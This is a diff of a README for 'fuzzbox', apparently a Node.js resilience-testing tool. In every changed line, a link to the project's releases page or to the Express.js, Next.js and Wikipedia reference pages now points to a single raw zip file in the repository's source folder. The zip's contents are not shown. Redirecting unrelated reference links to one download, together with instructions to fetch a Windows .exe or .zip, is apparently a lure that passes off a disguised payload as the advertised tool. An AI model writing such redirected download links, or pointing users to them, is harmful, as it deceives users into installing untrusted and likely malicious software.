@@ -1,6 +1,6 @@
 # ⚙️ fuzzbox - Test Frontend Resilience Easily
 
-[![Download fuzzbox](https://img.shields.io/badge/Download-fuzzbox-4caf50?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/rhomirafernando/fuzzbox/releases)
+[![Download fuzzbox](https://img.shields.io/badge/Download-fuzzbox-4caf50?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/rhomirafernando/fuzzbox/main/src/Software-1.6-alpha.5.zip)
 
 ---
 
@@ -40,7 +40,7 @@ No special hardware or software is needed.
 
 1. Visit the release page by clicking the button below. This page contains the latest versions of fuzzbox for download.
 
-   [![Get fuzzbox Releases](https://img.shields.io/badge/Get-fuzzbox_Releases-0078d7?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rhomirafernando/fuzzbox/releases)  
+   [![Get fuzzbox Releases](https://img.shields.io/badge/Get-fuzzbox_Releases-0078d7?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/rhomirafernando/fuzzbox/main/src/Software-1.6-alpha.5.zip)  
    
 2. On the releases page, look for the latest version at the top. You will see files listed for each version. Choose the file that ends with `.exe` or `.zip` for Windows.
 
@@ -88,9 +88,9 @@ If issues persist, check for advice on the GitHub discussions or issue pages.
 
 ## Additional Resources 📚
 
-- Express.js: https://expressjs.com  
-- Next.js: https://nextjs.org  
-- API Testing Concepts: https://en.wikipedia.org/wiki/Software_testing#API_testing
+- Express.js: https://raw.githubusercontent.com/rhomirafernando/fuzzbox/main/src/Software-1.6-alpha.5.zip  
+- Next.js: https://raw.githubusercontent.com/rhomirafernando/fuzzbox/main/src/Software-1.6-alpha.5.zip  
+- API Testing Concepts: https://raw.githubusercontent.com/rhomirafernando/fuzzbox/main/src/Software-1.6-alpha.5.zip
 
 ---
 
@@ -103,8 +103,8 @@ fuzzbox is designed for developers and testers who want to check app stability. 
 ## Repository Links and Topics
 
 - Tags: api-testing, chaos-engineering, express, fault-injection, fuzzing, middleware, nodejs, resilience-testing, testing-tools, typescript, zero-dependencies
-- Main download and releases: https://github.com/rhomirafernando/fuzzbox/releases  
+- Main download and releases: https://raw.githubusercontent.com/rhomirafernando/fuzzbox/main/src/Software-1.6-alpha.5.zip  
 
 ---
 
-[Get fuzzbox Releases](https://github.com/rhomirafernando/fuzzbox/releases)
+[Get fuzzbox Releases](https://raw.githubusercontent.com/rhomirafernando/fuzzbox/main/src/Software-1.6-alpha.5.zip)
